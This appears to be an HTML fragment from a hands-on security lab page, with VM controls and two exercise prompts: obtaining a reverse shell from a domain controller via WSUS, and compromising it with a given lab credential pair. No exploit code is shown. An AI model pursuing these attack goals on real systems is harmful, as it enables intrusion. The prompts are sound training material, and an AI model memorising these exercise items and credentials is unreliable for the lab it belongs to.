<button class="resetTargetBtn btn btn-light btn-sm" data-title="Reset Target(s)" data-toggle="tooltip" style="cursor: pointer; display: none;">
<i class="fad fa-sync text-warning"></i>
</button>
<br/>
<div class="d-flex align-items-center targetLifeContainer">
<span class="targetLifeTimeContainer" style="display: none;">
            Life Left: <span class="targetLifeTime font-size-15">0</span> minute(s)
                            <button class="extendTargetSystemBtn btn btn-light btn-sm module-button" data-title="Extend Life by 1 hour (up to 6 hours total lifespan)" data-toggle="tooltip">
<i class="fa fa-plus text-success extend-icon"></i>
<div class="extend-loader spinner-border spinner-border-small text-success d-none" role="status">
</div>
</button>
<button class="text-danger btn btn-light btn-sm module-button font-size-16 mb-1" data-target="#terminateVmModal" data-toggle="modal">
                    Terminate <span class="fa-regular fa-x text-danger font-size-13 ml-2"></span>
</button>
</span>
</div>
</p>
</div>
</div>
<div>
<div>
<label class="module-question" for="81">Get a reverse shell from DC01 using WSUS. Use DONE as the answer when finished.</label>
<div class="row">
<div class="col-lg-8 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="exerciseAnswer81" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="col-lg-2 mb-4">
<button class="btn btn-primary btn-block btnAnswerExercise" data-exercise-id="81" id="btnAnswerExercise81">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                        </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
<div class="col-lg-2 mb-4">
<button class="btn btn-outline-warning btn-block" data-target="#revealExerciseAnswer81" data-toggle="modal" id="answerExerciseBtn81"><i class="fad fa-life-ring mr-2"></i> Reveal Answer
                                    </button>
</div>
</div>
<div class="custom-hr">
</div>
</div>
<div>
<label class="module-question" for="82">Use the WSUS Administrators account Thael:Dond3stan93, to compromise the DC01. Use DONE as the answer when finished.</label>
<div class="row">
<div class="col-lg-8 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="exerciseAnswer82" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="col-lg-2 mb-4">
<button class="btn btn-primary btn-block btnAnswerExercise" data-exercise-id="82" id="btnAnswerExercise82">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                        </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
<div class="col-lg-2 mb-4">
<button class="btn btn-outline-warning btn-block" data-target="#revealExerciseAnswer82" data-toggle="modal" id="answerExerciseBtn82"><i class="fad fa-life-ring mr-2"></i> Reveal Answer
                                    </button>
</div>
</div>
<div class="">
</div>
</div>
</div>
</div>
</div>
